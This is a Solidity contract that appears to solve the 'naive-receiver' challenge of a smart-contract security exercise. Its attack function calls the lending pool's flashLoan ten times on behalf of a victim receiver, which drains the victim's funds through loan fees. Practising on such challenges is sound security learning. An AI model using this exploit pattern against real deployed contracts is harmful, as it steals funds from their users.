// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "../naive-receiver/NaiveReceiverLenderPool.sol";

contract AttackerLoanReceiver {
    NaiveReceiverLenderPool public pool;

    constructor(address payable poolAddress) {
      pool = NaiveReceiverLenderPool(poolAddress);
    }

    function attack(address victim) external payable {
      for (uint256 i = 0; i < 10; i++) {
          pool.flashLoan(victim, 0);
      }
    }
}